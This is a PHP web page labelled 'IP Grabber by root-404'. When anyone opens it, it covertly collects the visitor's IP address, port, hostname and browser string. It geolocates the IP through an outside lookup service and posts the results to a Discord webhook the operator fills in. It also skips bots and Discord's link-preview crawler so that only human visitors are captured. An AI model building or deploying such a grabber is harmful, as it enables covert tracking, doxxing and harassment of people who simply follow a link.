<DOCTYPE html>
    <html>
    <style>
body {
  background-image: url("1.jpg");
  background-position = "";

  }
</style>

<?php

$_protocol = $_SERVER['SERVER_PROTOCOL'];
$_ip = $_SERVER['REMOTE_ADDR'];
$_port = $_SERVER['REMOTE_PORT'];
$_agent = $_SERVER['HTTP_USER_AGENT'];
//$ref = $_SERVER['HTTP_REFERER'];
$_hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$_timestamp = date("c", strtotime("now"));

if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $_agent)) {
    exit();
}


$_ch1 = curl_init("http://ip-api.com/json/$_ip");
curl_setopt($_ch1, CURLOPT_RETURNTRANSFER, true);
$_info = json_decode(curl_exec($_ch1)); 
curl_close($_ch1);


$_isp = $_info->isp;
$_country = $_info->country;
$_region = $_info->regionName;
$_city = $_info->city;
$_webhook = "UR_WEBHOOK";


$_data = json_encode([

    "content" => "",

    "username" => "",

    "avatar_url" => "https://pbs.twimg.com/profile_images/972154872261853184/RnOg6UyU_400x400.jpg",

    "tts" => false,

    "embeds" => [

        [
            "title" => "IP Grabber by root-404",
            
            "type" => "rich",
            
            "description" => "",
            

            "url" => "https://github.com/root4041337",
            
            "timestamp" => $_timestamp,

            "color" => hexdec( "FFFFFF" ),
            
            "footer" => [
                "text" => "IP-Grabber by root-404",
                "icon_url" => ""
            ],

            "author" => [
                "name" => "",
                "url" => "https://github.com/root4041337"
            ],

            "fields" => [
                [
                    "name" => "Protocol: ",
                    "value" => $_protocol,
                    "inline" => false
                ],
                [
                    "name" => "IP: ",
                    "value" => $_ip,
                    "inline" => false
                ],
                [
                    "name" => "Port:",
                    "value" => $_port,
                    "inline" => false
                ],
                [
                    "name" => "Country: ",
                    "value" => $_country,
                    "inline" => false
                ],
                [
                    "name" => "ISP: ",
                    "value" => $_isp,
                    "inline" => false
                ],
                [
                    "name" => "Hostname: ",
                    "value" => $_hostname,
                    "inline" => false
                ],
                [
                    "name" => "Region: ",
                    "value" => $_region,
                    "inline" => false
                ],

                [
                    "name" => "Browser: ",
                    "value" => $_agent,
                    "inline" => false
                ]
            ]
        ]
    ]
    
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$_headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [ 'username' => 'IP-Grabber by root-404', 'content' => '' ];

$_ch = curl_init();
curl_setopt($_ch, CURLOPT_URL, $_webhook);
curl_setopt($_ch, CURLOPT_POST, true);
curl_setopt($_ch, CURLOPT_HTTPHEADER, $_headers);
curl_setopt($_ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($_ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($_ch, CURLOPT_POSTFIELDS, $_data);
$response   = curl_exec($_ch);
?>
</body>
</html>